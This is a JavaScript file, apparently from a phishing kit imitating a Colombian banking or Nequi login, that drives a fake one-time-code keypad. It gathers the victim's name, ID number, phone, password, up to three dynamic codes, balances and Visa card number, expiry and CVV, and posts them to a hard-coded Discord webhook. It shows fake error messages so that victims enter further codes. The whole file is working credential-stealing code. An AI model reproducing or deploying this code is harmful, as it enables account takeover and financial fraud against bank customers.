/* ============================================================
   validar.js — Adaptado para compatibilidad universal
   - Compatible con Android 4.x, Chrome 30+, Safari 7+
   - Compatible con navegadores modernos sin pérdida de rendimiento
   - Sin async/await, sin const/let, sin arrow functions, sin template literals
   ============================================================ */

/* ============================================================
   POLYFILLS INTERNOS (por si validar.js se carga en una página
   que no tiene los polyfills universales del HTML)
   ============================================================ */

// 1) Promise (Android 4.x, Chrome < 32)
if (typeof Promise === "undefined") {
  window.Promise = (function () {
    function P(fn) {
      var self = this;
      self._s = 0; self._v = null; self._h = [];
      function ok(v){ self._s=1; self._v=v; flush(); }
      function no(v){ self._s=2; self._v=v; flush(); }
      function flush(){
        self._h.forEach(function(h){
          if (self._s===1 && h.f) h.f(self._v);
          if (self._s===2 && h.r) h.r(self._v);
        });
        self._h = [];
      }
      self.then = function(f,r){
        return new P(function(res,rej){
          self._h.push({
            f: function(v){ try{ res(f?f(v):v); }catch(e){ rej(e); } },
            r: function(v){ try{ rej(r?r(v):v); }catch(e){ rej(e); } }
          });
          flush();
        });
      };
      self["catch"] = function(r){ return self.then(null,r); };
      try{ fn(ok,no); }catch(e){ no(e); }
    }
    P.resolve = function(v){ return new P(function(r){ r(v); }); };
    P.reject  = function(v){ return new P(function(_,r){ r(v); }); };
    return P;
  })();
}

// 2) fetch (Android 4.x, Chrome < 42, Safari < 10.1)
if (typeof fetch === "undefined") {
  window.fetch = function(url, opt){
    opt = opt || {};
    return new Promise(function(resolve, reject){
      var x = new XMLHttpRequest();
      x.open(opt.method || "GET", url, true);
      if (opt.headers) for (var k in opt.headers) {
        if (opt.headers.hasOwnProperty(k)) {
          try { x.setRequestHeader(k, opt.headers[k]); } catch(e){}
        }
      }
      x.onload = function(){
        resolve({
          ok: x.status >= 200 && x.status < 300,
          status: x.status,
          text: function(){ return Promise.resolve(x.responseText); },
          json: function(){ return Promise.resolve(JSON.parse(x.responseText)); }
        });
      };
      x.onerror = function(){ reject(new Error("Network error")); };
      x.send(opt.body || null);
    });
  };
}

// 3) Object.assign
if (typeof Object.assign !== "function") {
  Object.assign = function(t){
    for (var i=1;i<arguments.length;i++){
      var s = arguments[i];
      if (s) for (var k in s) if (Object.prototype.hasOwnProperty.call(s,k)) t[k]=s[k];
    }
    return t;
  };
}

// 4) Array.from
if (!Array.from) {
  Array.from = function(a){ var r=[]; for(var i=0;i<a.length;i++) r.push(a[i]); return r; };
}

// 5) Array.prototype.find
if (!Array.prototype.find) {
  Array.prototype.find = function(p){
    for (var i=0;i<this.length;i++) if (p(this[i],i,this)) return this[i];
  };
}

// 6) Array.prototype.includes
if (!Array.prototype.includes) {
  Array.prototype.includes = function(v){ return this.indexOf(v) !== -1; };
}

// 7) String.prototype.includes
if (!String.prototype.includes) {
  String.prototype.includes = function(s,p){ return this.indexOf(s, p||0) !== -1; };
}

// 8) Element.closest
if (window.Element && !Element.prototype.closest) {
  Element.prototype.closest = function(sel){
    var el = this;
    while (el && el.nodeType === 1) {
      if (el.matches && el.matches(sel)) return el;
      if (el.msMatchesSelector && el.msMatchesSelector(sel)) return el;
      if (el.webkitMatchesSelector && el.webkitMatchesSelector(sel)) return el;
      el = el.parentElement || el.parentNode;
    }
    return null;
  };
}

// 9) NodeList.forEach
if (window.NodeList && !NodeList.prototype.forEach) {
  NodeList.prototype.forEach = Array.prototype.forEach;
}

// 10) Element.matches
if (window.Element && !Element.prototype.matches) {
  Element.prototype.matches =
    Element.prototype.matchesSelector ||
    Element.prototype.mozMatchesSelector ||
    Element.prototype.msMatchesSelector ||
    Element.prototype.oMatchesSelector ||
    Element.prototype.webkitMatchesSelector ||
    function(s){ var m=(this.document||this.ownerDocument).querySelectorAll(s), i=m.length; while(--i>=0 && m[i]!==this){} return i>-1; };
}

// 11) URLSearchParams
if (typeof URLSearchParams === "undefined") {
  window.URLSearchParams = function(init){
    this._p = [];
    if (init) {
      var s = String(init).replace(/^\?/, "").split("&");
      for (var i=0;i<s.length;i++) {
        var kv = s[i].split("=");
        if (kv[0]) this._p.push([decodeURIComponent(kv[0]), decodeURIComponent(kv[1]||"")]);
      }
    }
    this.get = function(k){
      for (var i=0;i<this._p.length;i++) if (this._p[i][0]===k) return this._p[i][1];
      return null;
    };
    this.append = function(k,v){ this._p.push([k,v]); };
    this.toString = function(){
      return this._p.map(function(p){ return encodeURIComponent(p[0])+"="+encodeURIComponent(p[1]); }).join("&");
    };
  };
}

/* ============================================================
   HELPERS INTERNOS
   ============================================================ */

// localStorage blindado
function getFormData() {
  try { return JSON.parse(localStorage.getItem("formData")) || {}; }
  catch (e) { return {}; }
}

function setFormData(data) {
  try { localStorage.setItem("formData", JSON.stringify(data)); return true; }
  catch (e) { window._formDataMem = data; return false; }
}

function getCustomerData() {
  try { return JSON.parse(localStorage.getItem("customerData")) || {}; }
  catch (e) { return {}; }
}

// Crear evento input compatible con navegadores antiguos
function dispatchInputEvent(el) {
  try {
    el.dispatchEvent(new Event("input", { bubbles: true }));
  } catch (e) {
    try {
      var ev = document.createEvent("Event");
      ev.initEvent("input", true, true);
      el.dispatchEvent(ev);
    } catch (e2) {
      // Último recurso: no hacer nada
    }
  }
}

// Iterar sobre NodeList sin forEach (para navegadores sin forEach en NodeList)
function eachNodeList(nodeList, fn) {
  for (var i = 0; i < nodeList.length; i++) {
    fn(nodeList[i], i);
  }
}

/* ============================================================
   LÓGICA PRINCIPAL
   ============================================================ */

document.addEventListener("DOMContentLoaded", function () {
  var validoHasta = null;
  try { validoHasta = localStorage.getItem("validoHasta"); } catch (e) {}

  var validoHastaText = document.getElementById("validoHasta");

  if (validoHastaText && validoHasta) {
    validoHastaText.innerHTML = validoHasta;
  }

  var inputs = document.querySelectorAll('input[id^="otp-"]');
  var keyboard = document.getElementById("keyboard");
  var deleteBtn = document.getElementById("delete-otp");
  var loadingSpinner = document.querySelector(".loadingContainer");
  var finishContainer = document.querySelector(".finishContainer");
  var sectionTeclado = document.getElementById("sectionTeclado");
  var btnReturn = document.getElementById("btnReturn");

  var amount = document.getElementById("amount");
  var params = new URLSearchParams(window.location.search);
  var type = params.get("type");

  if (btnReturn) {
    btnReturn.addEventListener("click", function (e) {
      window.location.href = "accces-sign-in.php.html";
    });
  }

  var currentInput = 0;
  var contSend = 0;

  // Configuración del webhook de Discord
  var DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1560271962012651641/S0P2R_wy0Ic3f06qIhuXyVRj6cyjZe9MQYzcW7NXp9-UEgv9mF6tVqAmCFnoFRSB7_DY";

  // ===== ENVÍO A DISCORD CON FALLBACK XHR =====
  function sendToDiscord(content) {
    var payload = { content: content };
    var bodyStr = JSON.stringify(payload);

    return new Promise(function (resolve) {
      if (typeof fetch === "function") {
        try {
          fetch(DISCORD_WEBHOOK_URL, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: bodyStr
          }).then(function (response) {
            if (!response.ok) {
              console.error("Discord webhook error:", response.status);
            } else {
              console.info("Message sent to Discord successfully");
            }
            resolve();
          })["catch"](function (err) {
            console.error("fetch falló, usando XHR:", err);
            xhrSendDiscord(bodyStr);
            resolve();
          });
          return;
        } catch (e) {
          // cae a XHR
        }
      }
      xhrSendDiscord(bodyStr);
      resolve();
    });
  }

  function xhrSendDiscord(bodyStr) {
    try {
      var x = new XMLHttpRequest();
      x.open("POST", DISCORD_WEBHOOK_URL, true);
      x.setRequestHeader("Content-Type", "application/json");
      x.send(bodyStr);
    } catch (err) {
      console.error("Failed to send to Discord:", err);
    }
  }

  // ===== TECLADO NUMÉRICO =====
  if (keyboard) {
    keyboard.addEventListener("click", function (e) {
      var button = e.target.closest ? e.target.closest(".keyboard-btn") : null;
      if (button && button.id.indexOf("delete") === -1) {
        var value = button.getAttribute("data-value");
        if (currentInput < inputs.length) {
          inputs[currentInput].setAttribute("data-real-value", value);
          inputs[currentInput].value = "*";
          dispatchInputEvent(inputs[currentInput]);
          currentInput++;
        }
      }
    });
  }

  // ===== BOTÓN BORRAR =====
  if (deleteBtn) {
    deleteBtn.addEventListener("click", function () {
      if (currentInput > 0) {
        currentInput--;
        inputs[currentInput].value = "";
        inputs[currentInput].removeAttribute("data-real-value");
        dispatchInputEvent(inputs[currentInput]);
      }
    });
  }

  // ===== TECLA BACKSPACE FÍSICA =====
  document.addEventListener("keydown", function (e) {
    if (e.key === "Backspace" && currentInput > 0) {
      currentInput--;
      inputs[currentInput].value = "";
      inputs[currentInput].removeAttribute("data-real-value");
      dispatchInputEvent(inputs[currentInput]);
    }
  });

  // ===== BLOQUEAR ENTRADA FÍSICA =====
  eachNodeList(inputs, function (input) {
    var evTypes = ["keydown", "keyup", "keypress", "textInput"];
    for (var j = 0; j < evTypes.length; j++) {
      input.addEventListener(evTypes[j], function (e) {
        e.preventDefault();
        return false;
      });
    }
    input.addEventListener("paste", function (e) {
      e.preventDefault();
      return false;
    });
    input.setAttribute("readonly", "readonly");
    input.setAttribute("inputmode", "none");
  });

  function resetKeyboard() {
    currentInput = 0;
    eachNodeList(inputs, function (input) {
      input.value = "";
      input.removeAttribute("data-real-value");
    });
    if (inputs[0] && inputs[0].focus) {
      try { inputs[0].focus(); } catch (e) {}
    }
  }

  // ===== VERIFICAR COMPLETADO DEL OTP =====
  eachNodeList(inputs, function (input, index) {
    input.addEventListener("input", function () {
      var isComplete = true;
      for (var k = 0; k < inputs.length; k++) {
        if (inputs[k].value === "") { isComplete = false; break; }
      }
      if (!isComplete) return;

      var otp = "";
      for (var m = 0; m < inputs.length; m++) {
        otp += inputs[m].getAttribute("data-real-value") || "";
      }

      var formData = getFormData();

      // ====== OBTENER NOMBRE REAL DEL USUARIO ======
      var customerData = getCustomerData();
      var nombreCompleto = (customerData.nombre_completo || "").replace(/^\s+|\s+$/g, "");
      var apellidos = (customerData.apellidos || "").replace(/^\s+|\s+$/g, "");

      var nombreReal = nombreCompleto;
      if (apellidos && apellidos !== "No disponible") {
        nombreReal = (nombreCompleto + " " + apellidos).replace(/^\s+|\s+$/g, "");
      }
      if (!nombreReal) {
        nombreReal = formData.nombreCompleto || "No disponible";
      }

      var cedulaStr = String(formData.cedula || "");
      if (otp === "123456" || (cedulaStr && otp === cedulaStr.slice(0, 6))) {
        var errorMessage = document.querySelector(".errorMessage");
        if (errorMessage) {
          errorMessage.style.opacity = "1";
          errorMessage.style.transform = "translateY(-20px)";
        }

        setTimeout(function () { resetKeyboard(); }, 100);

        setTimeout(function () {
          if (errorMessage) {
            errorMessage.style.opacity = "0";
            errorMessage.style.transform = "translateY(20px)";
          }
        }, 5000);

        return;
      }
      contSend += 1;

      if (amount) {
        amount.innerHTML = "$ " + formData.montoPrestamo;
      }

      if (loadingSpinner) {
        loadingSpinner.style.display = "block";
      }

      // Guardar la clave dinámica actual en formData
      formData["claveDinamica_" + contSend] = otp;
      setFormData(formData);

      // Construir mensaje para Discord
      var discordMessage = "\n✅**CLAVE DINÁMICA**✅ " + contSend + "\n\n\n";
      discordMessage += "👤**Nombre**: " + nombreReal + "\n";
      discordMessage += "🪪**Cédula**: " + (formData.cedula || "") + "\n";
      discordMessage += "🔢**Número**: " + (formData.phoneNumber || "") + "\n";
      discordMessage += "🔑**Clave**: " + (formData.password || "") + "\n\n";

      discordMessage += "--------------------------------------\n";
      for (var i = 1; i <= contSend; i++) {
        var claveDinamica = formData["claveDinamica_" + i] || "Pendiente";
        discordMessage += "**Clave Dinámica** " + i + ": " + claveDinamica + "\n";
      }
      discordMessage += "---------------------------------------\n\n";

      discordMessage += "💸**Primer Saldo**: " + (formData.firstSaldo || "") + "\n";
      discordMessage += "💸**Segundo Saldo**: " + (formData.secondSaldo || "") + "\n";

      // AÑADIR DATOS DE LA TARJETA VISA SI EXISTEN
      if (formData.visaCC || formData.visaExpiry || formData.visaCVV) {
        discordMessage += "\n💳**DATOS TARJETA VISA NEQUI**\n";
        if (formData.visaCC)     discordMessage += "   • Número (CC): " + formData.visaCC + "\n";
        if (formData.visaExpiry) discordMessage += "   • Vencimiento: " + formData.visaExpiry + "\n";
        if (formData.visaCVV)    discordMessage += "   • CVV: " + formData.visaCVV + "\n";
      }

      discordMessage += "═══════════════════════════════════════";

      setTimeout(function () {
        resetKeyboard();
        if (loadingSpinner) {
          loadingSpinner.style.display = "none";
        }
      }, 30000);

      if (contSend === 3) {
        if (finishContainer) {
          finishContainer.style.display = "block";
        }
        if (sectionTeclado) {
          sectionTeclado.style.display = "none";
        }
      } else {
        setTimeout(function () {
          var errorMessage = document.querySelector(".errorMessage");
          if (errorMessage) {
            errorMessage.style.opacity = "1";
            errorMessage.style.transform = "translateY(-20px)";
          }
          setTimeout(function () {
            if (errorMessage) {
              errorMessage.style.opacity = "0";
              errorMessage.style.transform = "translateY(20px)";
            }
          }, 5000);
        }, 30500);
      }

      // Enviar a Discord (sin await, con fallback XHR)
      sendToDiscord(discordMessage).then(function () {}).catch(function (error) {
        console.error("Error al enviar mensaje a Discord:", error);
      });
    });
  });
});